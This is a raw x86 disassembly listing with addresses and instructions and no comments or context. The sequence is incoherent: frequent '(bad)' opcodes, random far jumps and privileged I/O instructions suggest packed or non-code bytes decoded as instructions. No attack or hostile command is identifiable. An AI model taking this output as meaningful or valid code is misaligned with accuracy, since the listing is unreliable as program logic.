  4205f9:	xor    ebx,ebp
  4205fb:	fstp   QWORD PTR [ecx+eiz*4]
  4205fe:	mov    al,ds:0x10b06e96
  420603:	pop    ds
  420604:	pop    ebx
  420605:	and    esp,eax
  420607:	(bad)  
  420608:	aam    0xfa
  42060a:	rcl    bh,cl
  42060c:	xchg   edx,eax
  42060d:	(bad)  
  42060e:	pop    ecx
  42060f:	mov    ebp,0x16e47f3e
  420614:	adc    DWORD PTR [ecx+0x51],esi
  420617:	ja     0x4205c2
  420619:	jecxz  0x420665
  42061b:	loope  0x4205da
  42061d:	push   edi
  42061e:	mov    ?,WORD PTR [edi+0x39e85a64]
  420624:	pusha  
  420625:	add    DWORD PTR [esi+0x4e2dce0d],ebx
  42062b:	ins    BYTE PTR es:[edi],dx
  42062c:	leave  
  42062d:	inc    edx
  42062e:	xchg   edx,eax
  42062f:	es aad 0xb3
  420632:	loope  0x420644
  420634:	js     0x42061a
  420636:	test   al,0x24
  420638:	push   edx
  420639:	pop    es
  42063a:	arpl   WORD PTR [eax-0x59],cx
  42063d:	mov    cl,0x19
  42063f:	dec    edi
  420640:	lahf   
  420641:	mov    dh,0x88
  420643:	mov    BYTE PTR [edx-0x6a],ah
  420646:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420647:	adc    al,0x6b
  420649:	xor    ch,ch
  42064b:	jp     0x420664
  42064d:	test   BYTE PTR [edx+0x26],bl
  420650:	in     eax,dx
  420651:	fisub  WORD PTR [ecx-0x151bf359]
  420657:	add    dl,BYTE PTR [ebx+0x33]
  42065a:	sub    eax,0xfb5872b2
  42065f:	ret    
  420660:	or     al,0x49
  420662:	and    bh,cl
  420664:	fwait
  420665:	mov    ch,0x98
  420667:	cmp    al,0xdd
  420669:	fbld   TBYTE PTR [eax]
  42066b:	sub    DWORD PTR [edx+eiz*8-0x7f],esi
  42066f:	jge    0x4206e9
  420671:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420672:	ds cwde 
  420674:	inc    DWORD PTR [eax+0x3b]
  420677:	loopne 0x420611
  420679:	je     0x4205fc
  42067b:	jg     0x4206b6
  42067d:	xchg   esp,eax
  42067e:	xchg   ecx,eax
  42067f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420680:	jmp    0x42061e
  420682:	xchg   esp,eax
  420683:	jge    0x420650
  420685:	add    al,0xec
  420687:	sar    eax,cl
  420689:	jg     0x420636
  42068b:	jl     0x4206a1
  42068d:	sbb    ch,BYTE PTR [eax+0x8]
  420690:	ds lahf 
  420692:	leave  
  420693:	aaa    
  420694:	jp     0x4206dd
  420696:	xor    al,bl
  420698:	daa    
  420699:	imul   esi,DWORD PTR [edx+0x19213629],0x54
  4206a0:	jecxz  0x4206b7
  4206a2:	call   0x6d66:0x305631df
  4206a9:	push   es
  4206aa:	jo     0x420641
  4206ac:	fwait
  4206ad:	pop    esi
  4206ae:	dec    ebx
  4206af:	fsubp  st(2),st
  4206b1:	in     eax,dx
  4206b2:	inc    ebx
  4206b4:	sbb    ebx,ebx
  4206b6:	push   ebp
  4206b7:	dec    ecx
  4206b8:	inc    ebx
  4206b9:	inc    eax
  4206ba:	and    al,0x76
  4206bc:	sbb    DWORD PTR [edi-0x4],ecx
  4206bf:	xchg   BYTE PTR [eax-0x7880bcbf],ah
  4206c5:	(bad)  
  4206c6:	gs shl dl,1
  4206c9:	lds    esi,FWORD PTR [esi]
  4206cb:	dec    ebx
  4206cc:	add    BYTE PTR [esi+0x1f1c64bc],bl
  4206d2:	sahf   
  4206d3:	inc    esi
  4206d4:	sbb    BYTE PTR [ecx-0x1],dl
  4206d7:	xor    DWORD PTR [ebp+0x5a95cef3],ecx
  4206dd:	sub    al,0x40
  4206df:	ss cmp eax,0x703b149a
  4206e5:	fcompp 
  4206e7:	popa   
  4206e8:	sbb    al,BYTE PTR [esi+esi*4-0x4cabcae5]
  4206ef:	inc    edx
  4206f0:	mov    al,ds:0x64dc0c27
  4206f5:	sub    eax,0x4aa53190
  4206fa:	cmp    edi,DWORD PTR [ecx]
  4206fc:	sub    ecx,ecx
  4206fe:	mov    DWORD PTR [edx+0x6a],0xddba4b58
  420705:	ror    edx,1
  420707:	xor    BYTE PTR [ecx],ch
  420709:	shr    DWORD PTR [ebp+0x49],cl
  42070c:	adc    eax,0x64c4c794
  420711:	inc    ebp
  420712:	adc    eax,0xc6dbeb4c
  420717:	xlat   BYTE PTR ds:[ebx]
  420718:	not    BYTE PTR [edx+0x347bf9b5]
  42071e:	mov    edx,0xeb475994
  420723:	mov    ecx,gs
  420725:	add    al,dl
  420727:	jbe    0x420707
  420729:	int3   
  42072a:	mov    bl,0x1
  42072c:	add    DWORD PTR ss:[esi-0x39],esp
  420730:	dec    edi
  420731:	xor    BYTE PTR [ecx],cl
  420733:	(bad)  
  420734:	std    
  420735:	hlt    
  420736:	(bad)  
  420737:	pop    ebx
  420738:	dec    ebp
  420739:	xor    al,0xe
  42073b:	adc    ebp,edi
  42073d:	sti    
  42073e:	sub    eax,0xba421828
  420743:	sub    ecx,eax
  420745:	ret    0x171e
  420748:	fdivp  st(3),st
  42074a:	xchg   edx,eax
  42074b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42074c:	jo     0x420729
  42074e:	sub    esp,DWORD PTR [eax]
  420750:	stos   DWORD PTR es:[edi],eax
  420751:	das    
  420752:	or     DWORD PTR [esi+ebx*2],edi
  420755:	xchg   edx,eax
  420756:	xchg   ebx,eax
  420757:	dec    ebp
  420758:	xlat   BYTE PTR ds:[ebx]
  420759:	pop    ebp
  42075a:	call   0xb48934fd
  42075f:	test   BYTE PTR [ebx-0x7188ce34],bl
  420765:	xchg   ecx,eax
  420766:	(bad)  
  420767:	jle    0x420758
  420769:	aad    0x26
  42076b:	ja     0x42078a
  42076d:	dec    ebp
  42076e:	(bad)  
  42076f:	stc    
  420770:	ja     0x420710
  420772:	ja     0x42075e
  420774:	pop    eax
  420775:	or     al,0x4
  420777:	retf   0x550d
  42077a:	cmp    al,0xf5
  42077c:	loopne 0x4207b0
  42077e:	(bad)  
  42077f:	jmp    0x77a7:0x39d320d4
  420786:	pop    edx
  420787:	cs xchg esp,eax
  420789:	imul   edx,edi,0x2306e7ae
  42078f:	dec    edx
  420790:	xor    ebp,edi
  420792:	or     BYTE PTR [esi+0x54],al
  420795:	int3   
  420796:	je     0x42076d
  420798:	ss in  al,0x33
  42079b:	ret    
  42079c:	xchg   edx,eax
  42079d:	pop    ebx
  42079e:	mov    ah,0x95
  4207a0:	jo     0x4207a2
  4207a2:	or     eax,DWORD PTR [eax]
  4207a4:	(bad)  
  4207a5:	sahf   
  4207a6:	shl    BYTE PTR [ebx+ecx*8-0x14],1
  4207aa:	xchg   ebp,eax
  4207ab:	cmp    ecx,DWORD PTR [ebp-0x6511264a]
  4207b1:	jg     0x4207e6
  4207b3:	sti    
  4207b4:	test   al,0x4d
  4207b6:	mov    esi,0xfab9c098
  4207bb:	sub    cl,BYTE PTR [ebx-0x178ebd60]
  4207c1:	mov    cl,0xe3
  4207c3:	push   es
  4207c4:	pushf  
  4207c5:	cwde   
  4207c6:	fdivr  st,st(0)
  4207c8:	push   ebp
  4207c9:	test   DWORD PTR [esi+0x7d5ae714],edi
  4207cf:	pusha  
  4207d0:	pushf  
  4207d1:	imul   DWORD PTR [ecx+0x29]
  4207d4:	jge    0x42082c
  4207d6:	scas   al,BYTE PTR es:[edi]
  4207d7:	jbe    0x420787
  4207d9:	mov    cl,0x8f
  4207db:	fld    QWORD PTR [edx]
  4207dd:	or     bl,BYTE PTR [eax-0x42]
  4207e0:	sbb    bh,ah
  4207e2:	push   ds
  4207e3:	out    dx,eax
  4207e4:	inc    esi
  4207e5:	dec    eax
  4207e6:	fild   WORD PTR [esi*1+0x51720c11]
  4207ed:	test   esi,esi
  4207ef:	xchg   ebp,eax
  4207f0:	ins    DWORD PTR es:[edi],dx
  4207f1:	cmp    BYTE PTR [ebp+0x2241ad86],al
  4207f7:	mov    ebx,0xcbdcc4b4
  4207fc:	pop    ecx
  4207fd:	cmp    al,0xcb
  4207ff:	xchg   edi,eax
  420800:	je     0x4207cc
  420802:	xchg   esp,eax
  420803:	loopne 0x42085a
  420805:	sub    ah,BYTE PTR [ebp-0x59]
  420808:	mov    dh,0x61
  42080a:	mov    dh,0xfb
  42080c:	leave  
  42080d:	jmp    0xcfc8:0xf566122e
  420814:	call   DWORD PTR [ebx-0x52d2de5c]
  42081a:	loop   0x4207be
  42081c:	mov    DWORD PTR [ecx+0x5d],ebp
  42081f:	jmp    0x4208a3
  420824:	add    BYTE PTR [eax],al
  420826:	add    BYTE PTR [eax],al
  420828:	add    BYTE PTR [eax],al
  42082a:	inc    esp
  42082b:	dec    ebp
  42082c:	dec    edx
  42082d:	dec    ebx
  42082e:	dec    ebx
  42082f:	dec    edi
  420830:	inc    ebp
  420831:	dec    edi
  420832:	sub    eax,0xa504921e
  420837:	add    edx,DWORD PTR [esi+0x1974cd2]
  42083d:	add    BYTE PTR [edi+0x6],bh
  420840:	add    BYTE PTR [eax],al
  420842:	out    dx,al
  420843:	popf   
  420844:	aaa    
  420845:	cli    
  420846:	shl    DWORD PTR [ebx+0x4fb4454c],1
  42084c:	sar    BYTE PTR [edx],cl
  42084e:	cmp    eax,0xea9279c3
  420853:	mov    ecx,0x9c04b009
  420858:	test   al,0xf7
  42085a:	or     ebp,ebx
  42085c:	rol    ch,cl
  42085e:	hlt    
  42085f:	ds mov ah,0x61
  420862:	stos   DWORD PTR es:[edi],eax
  420863:	sbb    eax,0xcebbf1d3
  420868:	xor    DWORD PTR [esi-0x68ef9c45],0x37d4fc32
  420872:	mov    ds:0xfa4bf18a,eax
  420877:	inc    eax
  420878:	add    edi,0xffffffbf
  42087b:	ret    
  42087c:	outs   dx,DWORD PTR ds:[esi]
  42087d:	hlt    
  42087e:	mov    edx,0xecd7250
  420883:	cli    
  420884:	inc    eax
  420885:	dec    esi
  420886:	ss cmp ebp,ecx
  420889:	mov    ebp,0x5b58b2ef
  42088e:	xchg   edx,eax
  42088f:	xchg   esp,eax
  420890:	dec    ebp
  420891:	push   eax
  420892:	imul   esi,DWORD PTR [eax+0x31348cb2],0x46
  420899:	sar    BYTE PTR [eax+ebx*2-0x2d],0x45
  42089e:	pop    ds
  42089f:	cmp    bl,ch
  4208a1:	xor    dl,BYTE PTR [edx-0x4]
  4208a4:	les    esi,FWORD PTR [ebp-0x17]
  4208a7:	ins    DWORD PTR es:[edi],dx
  4208a8:	sbb    al,0x5b
  4208aa:	xchg   BYTE PTR [ebp+0x5a],dl
  4208ad:	push   ebx
  4208ae:	fld    TBYTE PTR ds:0x9b01e829
  4208b4:	push   ebp
  4208b5:	mov    ecx,0x84e0b6db
  4208ba:	push   ebx
  4208bb:	rcr    BYTE PTR [ebx+0x5266b67f],0xf1
  4208c2:	test   DWORD PTR [eax-0x50],edi
  4208c5:	add    DWORD PTR [ebp-0x2d],eax
  4208c8:	in     eax,dx
  4208c9:	cmp    dl,ah
  4208cb:	adc    edx,DWORD PTR [edi-0x42e3db3a]
  4208d1:	add    dl,ch
  4208d3:	xchg   edi,eax
  4208d4:	hlt    
  4208d5:	sub    bh,BYTE PTR [edi]
  4208d7:	add    bh,BYTE PTR [edi+edi*1+0x9]
  4208db:	stos   BYTE PTR es:[edi],al
  4208dc:	push   0x92cae277
  4208e1:	in     al,dx
  4208e2:	jle    0x42093d
  4208e4:	pushf  
  4208e5:	out    0x2d,al
  4208e7:	sub    esp,ecx
  4208e9:	scas   al,BYTE PTR es:[edi]
  4208ea:	dec    ebx
  4208eb:	pushf  
  4208ec:	xor    ebx,ebp
  4208ee:	pop    edx
  4208ef:	shr    DWORD PTR [eax-0x32],0xd3
  4208f3:	in     eax,dx
  4208f4:	xchg   esp,eax
  4208f5:	jge    0x42095f
  4208f7:	sar    DWORD PTR [esi],1
  4208f9:	mov    edx,0xb8d3790a
  4208fe:	and    ecx,DWORD PTR [ecx-0x8]
  420901:	fwait
  420902:	scas   eax,DWORD PTR es:[edi]
  420903:	out    dx,eax
  420904:	fiadd  DWORD PTR [esp+esi*8+0x2ff685db]
  42090b:	sbb    dh,BYTE PTR [edi]
  42090d:	cld    
  42090e:	jb     0x4208ec
  420910:	jnp    0x4208cc
  420912:	sub    DWORD PTR [ecx],0xffffffe1
  420915:	mov    eax,ds:0x5c29dfff
  42091a:	in     eax,0xe7
  42091c:	shr    DWORD PTR [esi+0x677e9c16],cl
  420922:	cmc    
  420923:	test   BYTE PTR [edi],dl
  420925:	cmp    al,0x8a
  420927:	outs   dx,DWORD PTR ds:[esi]
  420928:	or     edi,edx
  42092a:	cmp    edx,DWORD PTR [eax+0x3f0ad164]
  420930:	call   0x7741f1d5
  420935:	inc    edx
  420936:	push   ebp
  420937:	jne    0x420990
  420939:	adc    al,0x85
  42093b:	aaa    
  42093c:	shr    BYTE PTR [ebp+0x2068f3b2],cl
  420942:	pop    ds
  420943:	iret   
  420944:	xchg   edx,eax
  420945:	dec    ebp
  420946:	inc    eax
  420947:	cwde   
  420948:	pop    ebx
  420949:	pop    ds
  42094a:	loope  0x420969
  42094c:	dec    edx
  42094d:	shl    DWORD PTR [ebp*4-0x6edbea4f],cl
  420954:	mov    esi,0xe194d702
  420959:	ret    0xab7d
  42095c:	scas   eax,DWORD PTR es:[edi]
  42095d:	pop    edx
  42095e:	mov    bh,BYTE PTR [eax+0xa]
  420961:	imul   ebp,DWORD PTR [ecx-0x4f],0x574a3625
  420968:	pop    ss
  420969:	js     0x4209c2
  42096b:	jns    0x42093e
  42096d:	daa    
  42096e:	cdq    
  42096f:	adc    al,0xd1
  420971:	adc    DWORD PTR [ebx],ecx
  420973:	push   edi
  420974:	inc    di
  420976:	mov    cl,0x51
  420978:	inc    eax
  420979:	xchg   ebx,eax
  42097a:	or     al,0x56
  42097c:	xor    ah,ch
  42097e:	mov    al,0x57
  420980:	inc    edi
  420981:	jnp    0x42092b
  420983:	fild   QWORD PTR [ebx]
  420985:	sbb    edi,esp
  420987:	arpl   WORD PTR [ebx+0x58],sp
  42098a:	outs   dx,DWORD PTR ds:[esi]
  42098b:	mov    bh,0x5a
  42098d:	mov    eax,ds:0x3d58e8cd
  420992:	sub    al,0x12
  420994:	inc    ecx
  420995:	jne    0x4209a2
  420997:	ins    DWORD PTR es:[edi],dx
  420998:	fadd   DWORD PTR [ecx-0x49]
  42099b:	xlat   BYTE PTR ds:[ebx]
  42099c:	inc    esp
  42099d:	push   0xfbd356
  4209a2:	add    ebx,0xffffffe5
  4209a5:	fcomp  QWORD PTR [ebx-0x20]
  4209a8:	pop    edi
  4209a9:	imul   edi
  4209ab:	imul   edi,DWORD PTR ds:0x91d12f2c,0x11
  4209b2:	jns    0x420a1f
  4209b4:	icebp  
  4209b5:	test   al,bl
  4209b7:	(bad)  
  4209b8:	jmp    0xd699:0xcb9b9249
  4209bf:	jp     0x4209f9
  4209c1:	sub    ebp,0x4cd43b42
  4209c7:	push   ds
  4209c8:	bound  edi,QWORD PTR [ebx+0x37]
  4209cb:	and    DWORD PTR [eax],esp
  4209cd:	in     al,dx
  4209ce:	add    ah,BYTE PTR [ebx]
  4209d0:	test   eax,0xf932f0c4
  4209d5:	adc    BYTE PTR [esi+0x54],dh
  4209d8:	sbb    al,0x1b
  4209db:	pushf  
  4209dc:	cs repz push cs
  4209df:	push   cs
  4209e0:	push   ecx
  4209e1:	lods   eax,DWORD PTR ds:[esi]
  4209e2:	in     al,dx
  4209e3:	stos   WORD PTR es:[edi],ax
  4209e5:	sub    BYTE PTR [eax*4-0x1f96915e],bl
  4209ec:	xchg   edi,eax
  4209ed:	mov    ebp,0xa8a2e70a
  4209f2:	xor    al,0x29
  4209f4:	add    esi,DWORD PTR [ebx]
  4209f6:	inc    esp
  4209f7:	add    ch,BYTE PTR [ebx+0x24]
  4209fa:	fs inc ebx
  4209fc:	les    esp,FWORD PTR [ebx-0x69]
  4209ff:	add    al,0xde
  420a01:	pop    ecx
  420a02:	mov    edx,0x47693793
  420a07:	out    dx,al
  420a08:	ins    DWORD PTR es:[edi],dx
  420a09:	cld    
  420a0a:	inc    eax
  420a0b:	xchg   ebp,eax
  420a0c:	xchg   edx,eax
  420a0d:	out    dx,al
  420a0e:	mov    ebp,0xa5f163ae
  420a13:	imul   esi,DWORD PTR [eax+0x49e041e],0x880da8a
  420a1d:	cmp    al,0x17
  420a1f:	jbe    0x4209f4
  420a21:	jmp    0xdfde24de
  420a26:	fadd   DWORD PTR [ecx+0x40]
  420a29:	dec    edx
  420a2a:	and    DWORD PTR [ebp+0x723f8830],edx
  420a30:	push   esp
  420a31:	cwde   
  420a32:	inc    ebx
  420a33:	jg     0x4209b5
  420a35:	dec    edx
  420a36:	xchg   esp,eax
  420a37:	push   es
  420a38:	fs cmp eax,0x1403c638
  420a3e:	data16 mov WORD PTR [esi-0x60da168c],?
  420a45:	(bad)  
  420a46:	mov    cl,0x22
  420a48:	push   ds
  420a49:	ja     0x420a5b
  420a4b:	ret    0x2eef
  420a4e:	into   
  420a4f:	(bad)  
  420a50:	inc    BYTE PTR [edi-0x1eaf3763]
  420a56:	xor    eax,0x5a4c0418
  420a5b:	push   eax
  420a5c:	lock fld DWORD PTR [esi+0x36e8f095]
  420a63:	cs xor ebx,esp
  420a66:	icebp  
  420a67:	stos   BYTE PTR es:[edi],al
  420a68:	mov    eax,eax
  420a6a:	mov    edx,0x8c477cef
  420a6f:	mov    ah,0xf7
  420a71:	pop    ecx
  420a72:	stos   DWORD PTR es:[edi],eax
  420a73:	scas   eax,DWORD PTR es:[edi]
  420a74:	aad    0xe9
  420a76:	cdq    
  420a77:	sub    esp,esp
  420a79:	and    bl,BYTE PTR [edi+0x3ae432ec]
  420a7f:	xchg   esp,eax
  420a80:	scas   al,BYTE PTR es:[edi]
  420a81:	fldenv [edx+0x7c]
  420a84:	xor    ebx,DWORD PTR [ebx+0x1a03a050]
  420a8a:	pop    eax
  420a8b:	cmp    DWORD PTR ds:0xeb5cc02b,edx
  420a91:	dec    esp
  420a92:	adc    eax,0xa7e37d5c
  420a97:	inc    edi
  420a98:	icebp  
  420a99:	and    BYTE PTR [edx],0x2
  420a9c:	add    ah,BYTE PTR [ebx+0x2b]
  420a9f:	aas    
  420aa0:	mov    edi,0xf994eb0f
  420aa5:	mov    bh,0x67
  420aa7:	inc    eax
  420aa8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420aa9:	shl    DWORD PTR [ecx-0x7a],cl
  420aac:	sub    al,BYTE PTR [edx]
  420aae:	dec    eax
  420aaf:	stc    
  420ab0:	out    dx,al
  420ab1:	mov    ds:0xc0781eaa,eax
  420ab6:	or     eax,esp
  420ab8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ab9:	inc    eax
  420aba:	div    DWORD PTR [eax+0x4d12984c]
  420ac0:	xor    dl,dh
  420ac2:	aaa    
  420ac3:	repz call DWORD PTR [esi+0x40]
  420ac7:	mov    edi,ebp
  420ac9:	mov    WORD PTR [ecx-0x63af992f],cs
  420acf:	jge    0x420b2f
  420ad1:	test   bl,bh
  420ad3:	fpatan 
  420ad5:	sar    bl,0x5c
  420ad8:	push   ecx
  420ad9:	leave  
  420ada:	mov    al,ds:0x7439e410
  420adf:	outs   dx,BYTE PTR ds:[esi]
  420ae0:	push   ecx
  420ae1:	adc    al,BYTE PTR [edx-0x14]
  420ae4:	xor    DWORD PTR [edx-0x58284bc6],edi
  420aea:	pop    esp
  420aeb:	rcr    ecx,0x8
  420aee:	loopne 0x420afe
  420af0:	and    eax,0xa07ac534
  420af5:	mov    bh,0xf6
  420af7:	pop    eax
  420af8:	add    DWORD PTR [esi+edx*8-0x45],ebp
  420afc:	fdiv   QWORD PTR [edx+0x59d61c0]
  420b02:	cli    
  420b03:	add    al,0x34
  420b05:	mov    gs,WORD PTR [edi]
  420b07:	mov    edi,0x642cc05d
  420b0c:	jmp    0xc91f:0x6ff0ea0e
  420b13:	pop    eax
  420b14:	push   esi
  420b15:	es clc 
  420b17:	add    eax,0x314902ba
  420b1c:	pop    ebp
  420b1d:	hlt    
  420b1e:	fld    QWORD PTR [esi]
  420b20:	or     dh,BYTE PTR es:[ebp+eiz*2-0x496ba88f]
  420b28:	fsubr  QWORD PTR [ebp+ebp*2+0x9]
  420b2c:	ss jmp 0x1ca8:0x1e40dc3d
  420b34:	lds    ebx,FWORD PTR ds:[esi]
  420b37:	fwait
  420b38:	xchg   esi,eax
  420b39:	cmp    ah,BYTE PTR [edx-0x50]
  420b3c:	clc    
  420b3d:	pop    esi
  420b3e:	pop    ebx
  420b3f:	lods   eax,DWORD PTR ds:[esi]
  420b40:	lea    ecx,[ecx-0x1905a230]
  420b46:	jg     0x420b39
  420b48:	imul   edi,DWORD PTR [ebx+eiz*8+0x6d],0x7b
  420b4d:	mov    ebp,DWORD PTR [edi-0x176cf007]
  420b53:	jno    0x420b3a
  420b55:	(bad)  
  420b56:	mov    ebx,0x3a32ce52
  420b5b:	nop
  420b5c:	xor    al,0x9f
  420b5e:	xchg   edx,eax
  420b5f:	inc    ebx
  420b60:	add    DWORD PTR [esi+eiz*2],eax
  420b63:	push   es
  420b64:	fcmovbe st,st(1)
  420b66:	mov    ss,WORD PTR [edx-0x73f5501e]
  420b6c:	(bad)  
  420b6d:	retf   
  420b6e:	cwde   
  420b6f:	repnz and al,0x2f
  420b72:	mov    BYTE PTR [ebp+0x2a],dh
  420b75:	add    dh,BYTE PTR [eax+edi*2-0x58]
  420b79:	xor    bh,BYTE PTR [ebx]
  420b7b:	xchg   ebx,eax
  420b7c:	fprem  
  420b7e:	aam    0x50
  420b80:	push   cs
  420b81:	mov    DWORD PTR [ebx],ebx
  420b83:	(bad)  
  420b84:	fsubr  DWORD PTR [edi]
  420b86:	pusha  
  420b87:	stos   DWORD PTR es:[edi],eax
  420b88:	mov    bl,0x50
  420b8a:	lods   al,BYTE PTR ds:[esi]
  420b8b:	outs   dx,DWORD PTR ds:[esi]
  420b8c:	lahf   
  420b8d:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b8f:	test   eax,0x8c011755
  420b94:	dec    edi
  420b95:	adc    al,0x28
  420b97:	mov    cs,edi
  420b99:	dec    eax
  420b9a:	cmp    bh,BYTE PTR [ebx-0x4b]
  420b9d:	xor    ebx,DWORD PTR [esi-0x370c37a2]
  420ba3:	fs enter 0x5eda,0x93
  420ba8:	daa    
  420ba9:	int3   
  420baa:	and    DWORD PTR ds:0x8ec7ef84,edi
  420bb0:	jns    0x420bdc
  420bb2:	rol    DWORD PTR [esp+ebp*4-0x2b],0x7e
  420bb7:	and    BYTE PTR [edi],al
  420bb9:	retf   0x6bcf
  420bbc:	mov    ecx,0x120e09c
  420bc1:	pop    ds
  420bc2:	pop    edi
  420bc3:	pop    es
  420bc4:	and    eax,0x6bc17cb6
  420bc9:	mov    edi,0x1d950462
  420bce:	xchg   BYTE PTR [edx-0x4a],bl
  420bd1:	lods   al,BYTE PTR ds:[esi]
  420bd2:	sbb    BYTE PTR [edx+0x36],0x69
  420bd6:	jns    0x420b75
  420bd8:	xor    esi,DWORD PTR [ebx-0x2c]
  420bdb:	pusha  
  420bdc:	dec    ebx
  420bdd:	call   0x2ee688ab
  420be2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420be3:	dec    esp
  420be4:	mov    ebx,0x9474771d
  420be9:	mov    dl,0x5c
  420beb:	cs mov cs,edi
  420bee:	jae    0x420c07
  420bf0:	popa   
  420bf1:	adc    BYTE PTR [edi-0x1c],dh
  420bf4:	loopne 0x420b7e
  420bf6:	push   ds
  420bf7:	shl    BYTE PTR [eax],1
  420bf9:	push   eax
  420bfa:	hlt    
  420bfb:	mov    cl,0xc1
  420bfd:	push   0xffffffa6
  420bff:	push   0x39
  420c01:	inc    esp
  420c02:	mov    ebp,0x87298695
  420c07:	cs out 0x89,al
  420c0a:	loopne 0x420c37
  420c0c:	aas    
  420c0d:	xchg   ebp,eax
  420c0e:	adc    DWORD PTR [ebp+esi*4-0x7ef9f27a],ebx
  420c15:	adc    DWORD PTR [edx],esp
  420c17:	and    eax,0x84891ca7
  420c1c:	fidivr WORD PTR ds:[ecx+0x3e4d9527]
  420c23:	mov    ebp,0xef675ce5
  420c28:	push   0xffffffbb
  420c2a:	cs jne 0x420bcf
  420c2d:	popf   
  420c2e:	mov    ch,0x52
  420c30:	fld    st(7)
  420c32:	adc    dl,dh
  420c34:	sub    ah,ch
  420c36:	cmp    eax,0xa6c61abc
  420c3b:	sub    DWORD PTR ds:0x3071a671,ebp
  420c41:	and    ecx,DWORD PTR [edi]
  420c43:	rol    bh,cl
  420c45:	pop    es
  420c46:	(bad)  
  420c47:	fucomip st,st(5)
  420c49:	jmp    0x39a3:0xcd102e14
  420c50:	(bad)  
  420c51:	rcl    BYTE PTR [ecx+eax*2-0x25d0f06c],cl
  420c58:	or     ebx,DWORD PTR [ebx]
  420c5a:	and    eax,0xde64f480
  420c5f:	mov    eax,0x6c37d31
  420c64:	nop
  420c65:	pushf  
  420c66:	stos   DWORD PTR es:[edi],eax
  420c67:	cli    
  420c68:	and    edx,DWORD PTR [edx-0x60]
  420c6b:	lahf   
  420c6c:	sbb    eax,0x7a8d1ffd
  420c71:	repnz out 0xb8,al
  420c74:	ret    0xb0e9
  420c77:	push   ecx
  420c78:	xor    cl,BYTE PTR [esi+ecx*8+0x11]
  420c7c:	adc    ebx,esi
  420c7e:	(bad)  
  420c7f:	mov    DWORD PTR [eax-0x73545949],esp
  420c85:	leave  
  420c86:	push   es
  420c87:	pusha  
  420c88:	xor    DWORD PTR [eax+0x67],ebx
  420c8b:	mov    al,0x78
  420c8d:	adc    BYTE PTR [esi+0x56161e5b],ah
  420c93:	enter  0xcdbd,0xdc
  420c97:	mov    esi,0x1d09cb7a
  420c9c:	in     al,0xab
  420c9e:	mov    edx,0x759fb189
  420ca3:	outs   dx,DWORD PTR ds:[esi]
  420ca4:	sbb    DWORD PTR [edi],ebp
  420ca6:	sbb    bh,ch
  420ca8:	daa    
  420ca9:	ins    BYTE PTR es:[edi],dx
  420caa:	(bad)  
  420cab:	gs push cs
  420cad:	xor    eax,0xb365fbe9
  420cb2:	cmp    dh,BYTE PTR [edx]
  420cb4:	cmp    bh,BYTE PTR [edx+0x5600cf78]
  420cba:	sub    ebp,DWORD PTR [edi+0x3d]
  420cbd:	inc    eax
  420cbe:	imul   ebp,DWORD PTR [ebp+0x7f7cc84],0xffffffa4
  420cc5:	jp     0x420cde
  420cc7:	mov    fs,WORD PTR [eax+0x50]
  420cca:	fsubr  QWORD PTR fs:[ebx+0x32]
  420cce:	inc    ebx
  420ccf:	jecxz  0x420c62
  420cd1:	shl    BYTE PTR [ecx+0x39a6c3c6],0xd5
  420cd8:	(bad)  
  420cd9:	mov    edi,0xb99fcf24
  420cde:	adc    al,0xf0
  420ce0:	push   ebx
  420ce1:	inc    ebp
  420ce2:	mov    esi,0xaac894e0
  420ce7:	xchg   edx,eax
  420ce8:	call   0xdd52:0xc3204a0c
  420cef:	in     eax,0x18
  420cf1:	mov    BYTE PTR [eax],dh
  420cf3:	fmul   DWORD PTR [edx]
  420cf5:	sahf   
  420cf6:	mov    ch,0x6c
  420cf8:	les    ecx,FWORD PTR [esi-0x62]
  420cfb:	jp     0x420d7c
  420cfd:	or     DWORD PTR [edx-0x32a49e2c],edx
  420d03:	push   ss
  420d04:	jno    0x420cb4
  420d06:	xchg   ebx,eax
  420d07:	jnp    0x420cd1
  420d09:	iret   
  420d0a:	adc    eax,0xdb2c33ab
  420d0f:	lock fidivr DWORD PTR [edx]
  420d12:	scas   al,BYTE PTR es:[edi]
  420d13:	xchg   ebp,eax
  420d14:	ds ds ret 
  420d17:	sbb    edx,DWORD PTR [esi-0x43]
  420d1a:	mov    ecx,0xcdfb9eb4
  420d1f:	mov    ds,eax
  420d21:	push   es
  420d22:	or     al,BYTE PTR [eax-0x1c4bd5ae]
  420d28:	and    al,BYTE PTR [edx-0x2]
  420d2b:	mov    ah,0x1
  420d2d:	test   DWORD PTR [eax+0x5754d927],ecx
  420d33:	hlt    
  420d34:	enter  0x2640,0x48
  420d38:	mov    dh,0x9e
  420d3a:	and    al,0xa1
  420d3c:	ror    DWORD PTR [ecx+0x55],1
  420d3f:	push   ebp
  420d40:	dec    edi
  420d41:	arpl   WORD PTR [ebx],cx
  420d43:	scas   eax,DWORD PTR es:[edi]
  420d44:	into   
  420d45:	inc    ebp
  420d46:	xchg   ecx,eax
  420d47:	shr    esi,0x4d
  420d4a:	sahf   
  420d4b:	fidivr WORD PTR [edx]
  420d4d:	jne    0x420cf8
  420d4f:	adc    BYTE PTR [ecx],dh
  420d51:	pop    ds
  420d52:	fistp  QWORD PTR [ecx]
  420d54:	test   DWORD PTR [edi],ebp
  420d56:	sub    al,BYTE PTR [esi]
  420d58:	or     eax,0xc569e0a0
  420d5d:	int3   
  420d5e:	enter  0x1523,0x3f
  420d62:	fldenv ds:0x2ef126a
  420d68:	stos   BYTE PTR es:[edi],al
  420d69:	pop    ebp
  420d6a:	(bad)  
  420d6b:	js     0x420d4c
  420d6d:	push   0xffffff88
  420d6f:	mov    ecx,0x82547371
  420d74:	cmp    al,0x59
  420d76:	in     eax,0x35
  420d78:	out    0x17,eax
  420d7a:	outs   dx,DWORD PTR ds:[esi]
  420d7b:	in     al,dx
  420d7c:	sub    ecx,DWORD PTR [edi]
  420d7e:	jno    0x420d2b
  420d80:	aaa    
  420d81:	adc    bl,al
  420d83:	mov    ebp,0xd7e57df0
  420d88:	in     al,dx
  420d89:	scas   al,BYTE PTR es:[edi]
  420d8a:	xor    BYTE PTR [ecx-0x3bc89443],al
